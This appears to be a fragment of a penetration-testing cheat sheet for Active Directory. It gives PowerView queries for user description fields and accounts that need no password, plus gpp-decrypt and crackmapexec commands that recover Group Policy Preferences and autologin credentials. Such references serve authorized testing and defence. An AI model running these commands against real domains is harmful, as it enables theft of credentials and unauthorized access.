### Description Fields
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
### PASSWD_NOTREQD
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
### Decrypt cpassword from groups.xml
```
gpp-decrypt <HASH>
crackmapexec smb <IP> -u <USER> -p <PASS> -M gpp_autologin
```